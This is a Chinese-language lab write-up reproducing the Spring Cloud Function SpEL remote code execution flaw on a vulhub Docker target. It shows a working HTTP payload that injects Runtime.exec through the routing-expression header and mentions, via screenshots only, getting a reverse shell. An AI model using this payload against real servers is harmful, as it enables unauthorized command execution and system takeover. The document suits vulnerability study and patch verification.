# 0x00 实验环境

攻击机：192.168.172.128 #攻击机/反弹shell

靶场：vulhub搭建的靶场环境(192.168.172.128)

# 0x01 影响版本

3.0.0 <= Spring Cloud Function <= 3.2.2

# 0x02 漏洞复现

  1. 访问页面，默认页面:

![1659935857_62f09c717868646fd4857.png!small](https://image.3001.net/images/20220808/1659935857_62f09c717868646fd4857.png!small)

直接访问 http://192.168.172.128:8080/ 是一个错误页面

2\. 漏洞复现

访问http://192.168.172.128:8080/fuctionRouter并且抓包，修改请求方式为POST，并且还要添加spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("要执行的命令")，由于无法回显，我这里执行的是创建一个文件，然后再到docker容器内部查看是否创建成功来确定是否成功执行了命令。

POST /functionRouter HTTP/1.1

spring.cloud.function.routing-expression:
T(java.lang.Runtime).getRuntime().exec("touch /tmp/RCE")  
  
---  
  
![1659937281_62f0a201a9e02c0757929.png!small](https://image.3001.net/images/20220808/1659937281_62f0a201a9e02c0757929.png!small)

进入到docker容器内部，docker-compose exec spring bash，发现创建成功

![1659937399_62f0a27797f4d941d0c12.png!small](https://image.3001.net/images/20220808/1659937399_62f0a27797f4d941d0c12.png!small)

 **反弹shell**

![1659938585_62f0a719bac0a6d551cdc.png!small](https://image.3001.net/images/20220808/1659938585_62f0a719bac0a6d551cdc.png!small)

成功收到反弹过来的shell

![1659938650_62f0a75a29ce8a5d5adcd.png!small](https://image.3001.net/images/20220808/1659938650_62f0a75a29ce8a5d5adcd.png!small)

在监听中成功接受到了shell

